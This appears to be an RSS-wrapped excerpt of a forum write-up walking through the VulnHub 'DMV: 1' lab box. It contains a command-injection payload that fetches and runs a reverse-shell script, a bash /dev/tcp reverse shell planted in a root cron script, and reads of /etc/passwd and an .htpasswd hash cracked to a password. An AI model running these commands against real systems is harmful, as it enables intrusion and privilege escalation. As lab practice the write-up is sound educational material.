<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6c3ee0bb2c682a2169fe1427a2f57e24568e19c1.png" alt="" data-base62-sha1="frAhtZ0C6cj0Ki8zFI3HT9ONUFX" width="690" height="305"></p>
<p>So the easiest way to use this and for few spaces we should start the python SimpleHTTPServer and download our shell to this Box and run it</p>
<p>yt_url=%3c<code>cd${IFS}/var/www/html/images/;wget${IFS}http://192.168.56.1:8080/rev.py;python${IFS}rev.py</code></p>
<p>images is a writable folder we can find after using ls -la we have also tmp directory and the main is writable too but this just to check if we can run 3 commands in one line using (<img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> separator ,so let’s check if our Listener (nc) is UP and execute the command …</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c5c439454f4c1d8de7835fff263890ce87cb9a2b.png" alt="" data-base62-sha1="sdwt50TYRW9g4NuzbhBkrivBV47" width="689" height="175"></p>
<p>The response isn’t returning anything which means we are successfully connected to the shell <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>cat /etc/passwd<br>
root:x:0:0:root:/root:/bin/bash<br>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
sync:x:4:65534:sync:/bin:/bin/sync<br>
games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>
systemd-network:x:100:102:systemd Network Management,:/run/systemd/netif:/usr/sbin/nologin<br>
systemd-resolve:x:101:103:systemd Resolver,:/run/systemd/resolve:/usr/sbin/nologin<br>
syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>
lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>
dnsmasq:x:107:65534:dnsmasq,:/var/lib/misc:/usr/sbin/nologin<br>
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>
pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash</p>
<p>let’s search for the first flag</p>
<p>going to the main directory (/var/www/html/)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/859b6921293afd11aa536abe89259a6df3011dd8.png" alt="" data-base62-sha1="j3Wt6hUyK5ql9NKkuRISFZCfLvi" width="543" height="212"></p>
<p>you will find the first flag on the admin directory</p>
<p>cat /var/www/html/admin/flag.txt<br>
flag{0d8486a0c0c42503bb60ac77f4046ed7}</p>
<p>and also .htpasswd file</p>
<p>cat /var/www/html/admin/.htpasswd<br>
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/</p>
<p>If we crack the hash using hashcat we’ll got <strong>jessie</strong></p>
<p>itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie</p>
<p>maybe this will be useful for the root part …</p>
<p>Let’s go to the ROOT Part ! (is going to be short this time)</p>
<p>I uploaded many tools for enumeration as LinEnum and LinPeas but couldn’t find anything with these</p>
<p>I tried to use the password we found for the user dmv and nothing too !</p>
<p>I asked for a friend who did the box before I download it <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
<p>and he said look in cronjobs but still not finding a thing here !</p>
<p>So I remember that I saw a file in /tmp/ directory named clean.sh with one line</p>
<p>rm -rf downloads</p>
<p>so it clear the bash script delete the folder “downloads” !</p>
<p>So I modified it and put this line</p>
<p>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1’</p>
<p>and I again run my listener on port 4444</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c4cabeb4906db70865d5901488e1f39a918e501c.png" alt="" data-base62-sha1="s4TXII6OZNxV6PscQKUJPJ1atpW" width="690" height="381"></p>
<p>and I was lucky we are r00t <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>So another way to get the root is using pspy a processor spy</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/DominicBreuker/pspy/releases" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0d07fdbb8c75df7c7de997c9927ebee24009a37b.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/DominicBreuker/pspy/releases" target="_blank" rel="noopener nofollow ugc">Releases · DominicBreuker/pspy</a></h3>

<p>Monitor linux processes without root permissions. Contribute to DominicBreuker/pspy development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>(All the releases are in the link above for both 32bits and 64bits)</p>
<p>from the command uname -a in your shell you’ll define the system CPU architecture</p>
<p>Linux dmv 4.15.0-96-generic <span class="hashtag">#97-Ubuntu</span> SMP Wed Apr 1 03:25:46 UTC 2020 <strong>x86_64</strong></p>
<p>let’s upload it to our shell and make it executable (chmod +x pspy64) and execute it</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22c9c58221fa0d6492229ec10d383cf407b5c489.png" alt="" data-base62-sha1="4XKwHCqHG0JuH3wUTyWcZ9P1tjP" width="690" height="123"></p>
<p>So as you see the task is executed each minute with root privileges and our injected reverse shell is still being executed.</p>
<p>I hope everything was clear and excuse my English I’m doing my best here <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864/1</link>
        <pubDate>Tue, 28 Apr 2020 14:33:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20864-1</guid>
        <source url="https://0x00sec.org/t/vulnhub-dmv-1-writeup-walkthrough/20864.rss">(VulnHub) [DMV: 1] WriteUp — Walkthrough</source>
      </item>
  </channel>
</rss>
